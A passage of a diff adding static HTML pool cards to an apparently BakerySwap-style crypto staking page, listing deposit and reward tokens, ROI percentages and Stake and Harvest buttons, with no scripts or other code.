+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">MGOD</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">11.43%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_eth_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_eth.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">ETH-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">ETH-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">8.70%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_busd_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_busd.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">BUSD-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BUSD-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">16.89%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_usdt_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_usdt.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">USDT-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">USDT-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">19.69%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_doggy_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_doggy.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">DOGGY-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">DOGGY-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">12.15%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_car_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_car.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAR-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAR-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">25.14%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_car_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_car.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAR TO BAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAR</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">20.54%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_gat_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_gat.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">GAT-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">GAT-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">62.67%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_poker_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_poker.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">POKER-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">POKER-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">31.32%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_poker_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_poker.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">POKER TO BAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">POKER</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">27.51%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_tokau_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_tokau.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAKE-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">13.12%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_soccer_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_soccer.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">SOCCER-BNB BLP</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">SOCCER-BNB BLP</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">28.35%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_soccer_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="images/icon_soccer.svg"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">SOCCER</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">SOCCER</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">28.70%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+
+                <div
+                  style="background-image: url(images/icon_egg_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/15688.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">DOMI Online</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">DOMI</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">7.14%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_bread_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      style="width: auto; height: 54px"
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/10407.png"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">CAKE</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">CAKE</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">718%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_bake_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/15070.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">Notable</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">NBL</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">5.98%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    class="depositbtn sc-dHIava idVSmq stake"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb">Stake</a>
+                  </div>
+
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
+                    href="#"
+                    data-target="#claimModal"
+                    data-toggle="modal"
+                    class="claimbtn sc-dHIava idVSmq"
+                  >
+                    <a class="sc-iRbamj sc-gipzik sc-gJqsIT cMMZWR bb"
+                      >Harvest</a
+                    >
+                  </div>
+                </div>
+                <div
+                  style="background-image: url(images/icon_bake_light.svg)"
+                  class="sc-ugnQR sc-hAXbOi bBzOzb"
+                >
+                  <div class="sc-cCVOAp gVyiuR">
+                    <img
+                      src="images/icon_star_white.svg"
+                      class="sc-cfWELz kGupyk"
+                    />
+                  </div>
+                  <div class="sc-kAdXeD gHkqml">
+                    <img
+                      src="../s2.coinmarketcap.com/static/img/coins/64x64/7846.png"
+                      style="height: 54px; margin-bottom: 0px; margin-top: 0px"
+                      alt=""
+                    />
+                  </div>
+                  <div class="sc-hCaUpS fJhSop">
+                    <div class="css-2tt9xh">Unbound</div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Deposit:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">BAKE</div>
+                    </div>
+                  </div>
+                  <div class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">Earn:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-o8yhuq">UNB</div>
+                    </div>
+                  </div>
+                  <div style="margin-top: 32px" class="sc-bvTASY tSsQk">
+                    <div class="css-vurnku">ROI:</div>
+                    <div class="sc-koErNt dlxdfv">
+                      <div class="css-6z68fw">6.34%</div>
+                    </div>
+                  </div>
+                  <div
+                    style="cursor: pointer; margin-top: 20px"
